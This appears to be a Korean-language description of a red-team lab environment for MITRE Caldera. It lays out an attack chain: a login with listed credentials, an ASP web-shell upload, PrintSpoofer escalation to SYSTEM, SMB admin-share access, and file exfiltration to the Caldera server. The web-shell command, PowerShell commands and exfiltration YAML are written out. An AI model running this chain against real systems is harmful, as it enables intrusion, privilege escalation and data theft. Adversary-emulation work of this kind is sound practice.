# ttps1 환경 설명

## 네트워크 구성

- 웹 서버(DMZ): 192.168.56.105 (Windows 10, IIS)
- 내부망: 192.168.56.106 (Windows 10, SMB 활성화)
- Caldera server: 192.168.56.1:8888 (파일 유출시)

---

## 웹 애플리케이션

- 로그인: http://192.168.56.105/login_process.asp
  - 방식: POST 요청, Body 파라미터 `userid`, `password`
  - 계정: admin / P@ssw0rd!2020

- 파일 업로드: http://192.168.56.105/upload_handler.asp
  - 방식: POST 요청, multipart/form-data
  - 폼 필드 이름: `file`
  - 인증: 로그인 필요
  - 업로드 경로: /uploads/
- 세션 공유가 되지않음 파일 업로드시 로그인과 업로드를 한 동작으로 수행해야함

---

## 취약점 및 Exploit

1. **ASP 파일 업로드 취약점**
   - 확장자 검증 없음
   - 업로드 후 실행 가능: http://192.168.56.105/uploads/{파일명}

2. **PrintSpoofer 권한 상승**
   - SeImpersonatePrivilege 권한이 있는 IIS 서버 웹쉘을 이용해서 실행
   - 필요 파일: PrintSpoofer64.exe + vcruntime140.dll (C:\inetpub\wwwroot\uploads\에 미리 복사 필요)
   - 웹쉘 실행 예시: `http://192.168.56.105/uploads/cmd.asp?cmd=C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe -c "powershell.exe -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\uploads\deploy.ps1"`
   - deploy.ps1을 권한상승시켜 실행하면 SYSTEM 권한으로 새로운 Caldera agent가 생성됨
   - **주의**: `start /b`를 사용하지 말 것 - ASP 웹쉘 환경에서 오히려 timeout 발생

3. **SMB Admin Shares 접근**
   - C$ 공유 접근 가능
   - 계정은 웹 애플리케이션과 동일

---

## Caldera 환경

### Payload 파일
Caldera 서버에 업로드된 파일 (이용하려면 payload 에 적어줘야합니다.):
- cmd.asp (웹셸)
- PrintSpoofer64.exe
- vcruntime140.dll
- deploy.ps1 (Caldera agent 배포 스크립트)

### Payload 사용 방법

**중요**: Caldera payload 파일들은 agent의 working directory에 자동으로 다운로드됩니다.

**웹셸을 통한 실행이 필요한 경우**:
1. **Agent에서 직접** Copy-Item으로 웹 접근 가능 경로로 복사
   ```powershell
   Copy-Item -Path 'PrintSpoofer64.exe' -Destination 'C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe' -Force
   Copy-Item -Path 'vcruntime140.dll' -Destination 'C:\inetpub\wwwroot\uploads\vcruntime140.dll' -Force
   Copy-Item -Path 'deploy.ps1' -Destination 'C:\inetpub\wwwroot\uploads\deploy.ps1' -Force
   ```
2. 복사 완료 후 웹셸을 통해 실행
   ```powershell
   Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=...' -UseBasicParsing
   ```

**주의**: 웹셸을 통해 파일을 복사하려고 하면 실패합니다. Agent에서 직접 Copy-Item을 실행해야 합니다.

### 데이터 유출 (Exfiltration)

**Caldera Ability의 uploads 필드 사용**
- Ability YAML에 `uploads:` 필드 지정하면 Agent가 자동으로 Caldera 서버로 파일 전송
- 예시:
  ```yaml
  executors:
    - platform: windows
      name: psh
      command: Compress-Archive -Path C:\target\* -DestinationPath C:\temp\data.zip
      uploads:
        - C:\temp\data.zip
  ```

---

## 공격 흐름

로그인 → 웹셸 업로드 → 권한 상승 → 내부망 탐색 → SMB 접근 → 데이터 유출

---
